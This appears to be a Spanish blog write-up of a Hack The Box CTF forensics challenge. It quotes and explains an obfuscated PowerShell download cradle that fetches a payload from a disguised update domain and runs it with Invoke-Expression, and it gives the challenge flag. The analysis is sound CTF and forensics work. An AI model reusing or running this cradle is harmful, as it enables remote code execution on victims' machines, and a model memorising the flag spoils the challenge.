---
layout: single
title: Alien Cradle - CTF HTB Cyber Apocalypse 2023
excerpt: "Este es el segundo desafío forense del evento Cyber Apocalypse 2023 de Hack The Box. Se considera de dificultad very-easy y se nos proporciona un script de PowerShell pseudo-ofuscado que contiene la flag del desafío"
date: 2023-03-18
classes: wide
header:
  teaser: /assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - ctf
  - forense
tags:  
  - powershell
---

![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg)

**Dificultad:** very-easy

## Enunciado

_En un intento de que los extraterrestres encontraran más información sobre la reliquia, lanzaron un ataque dirigido a los amigos cercanos y socios de Pandora que pueden conocer información secreta al respecto. Durante un incidente reciente que se cree que fue operado por ellos, Pandora localizó un extraño script de PowerShell de los registros de eventos, también llamado soporte de PowerShell. Estos scripts generalmente se usan para descargar y ejecutar la siguiente etapa del ataque. Sin embargo, parece ofuscado y Pandora no puede entenderlo. ¿Puedes ayudarla a desofuscarlo?_

## unzip - cat - echo - tr

Se nos entrega un archivo llamado "forensics_alien_cradle.zip" el cual en su interior posee un script de PowerShell llamado `cradle.ps1`.

Los archivos .ps1 se utilizan para almacenar y ejecutar secuencias de comandos de PowerShell de manera que puedan ser reutilizados y ejecutados de forma repetitiva. Los scripts de PowerShell pueden contener una serie de instrucciones, llamadas a cmdlets (comandos de PowerShell), funciones personalizadas y lógica de programación para automatizar tareas, manipular datos, administrar sistemas y más.
```
❯ unzip -l forensics_alien_cradle.zip
Archive:  forensics_alien_cradle.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      618  2023-03-06 12:29   cradle.ps1
---------                     -------
      618                     1 file

```
Luego de descompimir el achivo procedemos a verificar el contenido de `cradle.ps1`, el cual se ve de la siguiente manera:

```
❯ cat cradle.ps1

if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};
$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));
$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

A modo de información el script `cradle.ps1` realiza las siguientes acciones:
  - Verifica si el nombre de usuario actual no es 'secret_HQ\Arth' utilizando `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name.` Si el nombre de usuario no coincide, el script se detiene y finaliza la ejecución.
  - Crea una nueva instancia de `net.webclient` con `$w = New-Object net.webclient`.
  - Descarga el contenido de una URL específica utilizando `$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64')`. La URL se construye concatenando las cadenas separadas por el simbolo `+`.
  - Crea una nueva instancia de `IO.MemoryStream` utilizando `[Convert]::FromBase64String($d)` para decodificar el contenido descargado en base64.
  - Define una cadena indetificada como `$f` con el valor `'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'`.
  - Utiliza `IO.StreamReader` y `IO.Compression.GzipStream` para descomprimir el contenido del archivo descargado. A continuación, utiliza `ReadToEnd()` para leer todo el contenido descomprimido.
  - Finalmente, se utiliza `IEX` (Invoke-Expression) para ejecutar el contenido obtenido en el paso anterior.

Resulta bastante sencillo encontrar la flag, ya que está declarada dentro del script como valor de la variable `$f`. En este caso, se utiliza el método de ofuscación de concatenación de cadenas. Para desofuscar el mensaje, procedemos a utilizar el siguiente comando:
```
❯ echo "'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}" | tr -dc '[:alnum:]{}_'
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}  
```

`tr -dc '[:alnum:]{}_'` : El comando `tr` en Linux es una herramienta que se utiliza para realizar operaciones de traducción o transliteración de caracteres en un flujo de texto. El nombre "tr" es una abreviatura de "translate" (traducir). En este caso se esta utilizando con el argumento `-d` para eliminar caracteres y -c para especificar los caracteres que queremos mantener. `'[:alnum:]{}_'` especifica que se deben mantener los caracteres alfanuméricos ([:alnum:]), los corchetes ({}) y los guiones bajos (\_). Los demás caracteres se eliminarán.

## Flag

**HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}**
